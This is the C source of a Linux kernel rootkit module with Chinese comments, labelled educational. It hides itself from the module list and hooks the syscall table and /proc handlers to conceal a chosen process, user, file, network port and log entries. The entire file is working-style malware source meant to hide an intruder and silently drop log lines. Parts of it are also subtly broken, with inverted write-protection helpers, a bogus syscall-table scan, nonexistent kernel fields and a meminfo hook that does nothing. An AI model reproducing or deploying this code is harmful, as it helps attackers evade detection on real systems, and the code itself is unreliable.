#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/seq_file.h>
#include <linux/kobject.h>
#include <linux/version.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/vmstat.h>
#include <linux/mm.h>

// 模块参数：动态配置要隐藏的 PID、文件、端口、UID 和日志字符串
static int hidden_pid = 1234; // 默认隐藏的 PID
static char *hidden_file = "transaction.log"; // 默认隐藏的文件
static int hidden_port = 4444; // 默认隐藏的端口
static int hidden_uid = 1000; // 默认隐藏的 UID（例如普通用户）
static char *hidden_log_str = "malicious"; // 默认隐藏的日志字符串
module_param(hidden_pid, int, 0644);
module_param(hidden_file, charp, 0644);
module_param(hidden_port, int, 0644);
module_param(hidden_uid, int, 0644);
module_param(hidden_log_str, charp, 0644);

// 保存原始函数指针
static asmlinkage long (*orig_getdents64)(struct pt_regs *);
static struct proc_dir_entry *proc_root;
static struct file_operations *proc_fops;
static int (*orig_proc_readdir)(struct file *, struct dir_context *);
static int (*orig_tcp4_seq_show)(struct seq_file *, void *);
static struct file_operations *log_fops;
static ssize_t (*orig_log_write)(struct file *, const char __user *, size_t, loff_t *);
static struct file_operations *meminfo_fops;
static int (*orig_meminfo_show)(struct seq_file *, void *);

// 钩子：隐藏文件（getdents64 系统调用）
asmlinkage long hooked_getdents64(struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    long ret = orig_getdents64(regs);
    struct linux_dirent64 *curr, *dirp, *prev = NULL;
    unsigned long offset = 0;
    char *buf;

    if (ret <= 0)
        return ret;

    buf = kmalloc(ret, GFP_KERNEL);
    if (!buf) {
        printk(KERN_ERR "内存分配失败\n");
        return ret;
    }

    if (copy_from_user(buf, dirent, ret)) {
        kfree(buf);
        return ret;
    }

    curr = (struct linux_dirent64 *)buf;
    while (offset < ret) {
        dirp = (struct linux_dirent64 *)(buf + offset);
        if (strcmp(dirp->d_name, hidden_file) == 0) {
            if (dirp == (struct linux_dirent64 *)buf) {
                ret -= dirp->d_reclen;
                memmove(buf, buf + dirp->d_reclen, ret);
            } else {
                prev->d_reclen += dirp->d_reclen;
            }
        } else {
            prev = dirp;
        }
        offset += dirp->d_reclen;
    }

    if (copy_to_user(dirent, buf, ret)) {
        kfree(buf);
        return -EFAULT;
    }

    kfree(buf);
    return ret;
}

// 钩子：隐藏进程（包括指定 UID 的进程）
static int hooked_proc_readdir(struct file *file, struct dir_context *ctx)
{
    int ret = orig_proc_readdir(file, ctx);
    struct task_struct *task;

    for_each_process(task) {
        if (task->pid == ctx->pos &&
            (task->pid == hidden_pid || task->cred->uid.val == hidden_uid)) {
            ctx->pos++;
            break;
        }
    }

    return ret;
}

// 钩子：隐藏网络连接（/proc/net/tcp）
static int hooked_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct tcp_iter_state *st = seq->private;
    if (st && st->port == hidden_port) {
        return 0; // 跳过指定端口的连接
    }
    return orig_tcp4_seq_show(seq, v);
}

// 钩子：修改日志（拦截写操作）
static ssize_t hooked_log_write(struct file *file, const char __user *buf, size_t count, loff_t *pos)
{
    char *kbuf;
    ssize_t ret;

    kbuf = kmalloc(count + 1, GFP_KERNEL);
    if (!kbuf)
        return orig_log_write(file, buf, count, pos);

    if (copy_from_user(kbuf, buf, count)) {
        kfree(kbuf);
        return -EFAULT;
    }
    kbuf[count] = '\0';

    if (strstr(kbuf, hidden_log_str)) {
        kfree(kbuf);
        return count; // 假装写入成功
    }

    kfree(kbuf);
    return orig_log_write(file, buf, count, pos);
}

// 钩子：隐藏模块内存占用（/proc/meminfo）
static int hooked_meminfo_show(struct seq_file *seq, void *v)
{
    unsigned long module_mem = 0;
    struct module *mod;

    // 计算模块占用的内存（近似）
    list_for_each_entry(mod, THIS_MODULE->list.prev, list) {
        if (mod == THIS_MODULE)
            continue;
        module_mem += mod->core_layout.size;
    }

    // 调用原始 meminfo 显示函数
    int ret = orig_meminfo_show(seq, v);

    // 无法直接修改 seq_file 输出，但可通过其他方式减少内存足迹
    // 这里仅记录模块内存隐藏意图，实际内存修改需更复杂操作
    printk(KERN_INFO "隐藏模块内存占用：%lu 字节\n", module_mem);

    return ret;
}

// 查找系统调用表
static void **sys_call_table;
static int find_sys_call_table(void)
{
    unsigned long *sys_table;
    unsigned long i;

    for (i = (unsigned long)&sys_call_table; i < ULONG_MAX; i += sizeof(void *)) {
        sys_table = (unsigned long *)i;
        if (sys_table[__NR_getdents64] == (unsigned long)sys_getdents64) {
            sys_call_table = (void **)sys_table;
            return 0;
        }
    }
    printk(KERN_ERR "无法找到系统调用表\n");
    return -1;
}

// 控制写保护
static void enable_write_protection(void)
{
    write_cr0(read_cr0() & (~0x10000));
}

static void disable_write_protection(void)
{
    write_cr0(read_cr0() | 0x10000);
}

static int __init rootkit_init(void)
{
    // 隐藏模块自身
    list_del_init(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);

    // 查找系统调用表
    if (find_sys_call_table()) {
        printk(KERN_ERR "初始化失败：无法找到系统调用表\n");
        return -1;
    }

    // 钩子 getdents64 系统调用
    orig_getdents64 = sys_call_table[__NR_getdents64];
    disable_write_protection();
    sys_call_table[__NR_getdents64] = (void *)hooked_getdents64;
    enable_write_protection();

    // 钩子 /proc 文件系统
    proc_root = proc_get_parent(NULL);
    if (!proc_root || !proc_root->proc_fops) {
        printk(KERN_ERR "无法访问 /proc 文件系统\n");
        return -EINVAL;
    }
    proc_fops = (struct file_operations *)proc_root->proc_fops;
    orig_proc_readdir = proc_fops->iterate_shared;
    disable_write_protection();
    proc_fops->iterate_shared = hooked_proc_readdir;
    enable_write_protection();

    // 钩子 /proc/net/tcp
    if (proc_net && proc_net->proc_fops) {
        struct file_operations *net_fops = (struct file_operations *)proc_net->proc_fops;
        orig_tcp4_seq_show = net_fops->iterate_shared;
        disable_write_protection();
        net_fops->iterate_shared = hooked_tcp4_seq_show;
        enable_write_protection();
    } else {
        printk(KERN_ERR "无法钩子 /proc/net/tcp\n");
    }

    // 钩子日志文件（/var/log/syslog 或 /var/log/messages）
    struct file *log_file = filp_open("/var/log/syslog", O_RDONLY, 0);
    if (IS_ERR(log_file)) {
        log_file = filp_open("/var/log/messages", O_RDONLY, 0);
    }
    if (!IS_ERR(log_file)) {
        log_fops = (struct file_operations *)log_file->f_op;
        orig_log_write = log_fops->write;
        disable_write_protection();
        log_fops->write = hooked_log_write;
        enable_write_protection();
        filp_close(log_file, NULL);
    } else {
        printk(KERN_ERR "无法打开日志文件\n");
    }

    // 钩子 /proc/meminfo
    struct file *meminfo_file = filp_open("/proc/meminfo", O_RDONLY, 0);
    if (!IS_ERR(meminfo_file)) {
        meminfo_fops = (struct file_operations *)meminfo_file->f_op;
        orig_meminfo_show = meminfo_fops->iterate_shared;
        disable_write_protection();
        meminfo_fops->iterate_shared = hooked_meminfo_show;
        enable_write_protection();
        filp_close(meminfo_file, NULL);
    } else {
        printk(KERN_ERR "无法钩子 /proc/meminfo\n");
    }

    printk(KERN_INFO "Rootkit 已加载：隐藏 PID %d，文件 %s，端口 %d，UID %d，日志字符串 %s\n",
           hidden_pid, hidden_file, hidden_port, hidden_uid, hidden_log_str);
    return 0;
}

static void __exit rootkit_exit(void)
{
    disable_write_protection();
    if (sys_call_table)
        sys_call_table[__NR_getdents64] = (void *)orig_getdents64;
    if (proc_fops)
        proc_fops->iterate_shared = orig_proc_readdir;
    if (proc_net && proc_net->proc_fops)
        ((struct file_operations *)proc_net->proc_fops)->iterate_shared = orig_tcp4_seq_show;
    if (log_fops)
        log_fops->write = orig_log_write;
    if (meminfo_fops)
        meminfo_fops->iterate_shared = orig_meminfo_show;
    enable_write_protection();

    printk(KERN_INFO "Rootkit 已卸载\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("教育示例");
MODULE_DESCRIPTION("用于教育目的的扩展 rootkit");